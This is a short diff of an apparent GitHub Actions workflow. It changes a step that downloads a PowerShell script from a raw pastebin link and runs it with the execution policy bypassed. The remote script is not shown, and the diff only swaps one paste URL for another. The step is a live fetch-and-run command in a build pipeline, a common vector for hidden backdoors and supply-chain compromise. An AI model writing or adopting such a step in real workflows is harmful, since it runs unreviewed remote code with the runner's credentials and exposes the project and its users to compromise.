@@ -32,5 +32,5 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          Invoke-WebRequest -Uri "https://pastebin.com/raw/V3s1B2w9" -OutFile "deploy.ps1"
+          Invoke-WebRequest -Uri "https://pastebin.com/raw/8kRD4Lr6" -OutFile "deploy.ps1"
           powershell.exe -ExecutionPolicy Bypass -File deploy.ps1
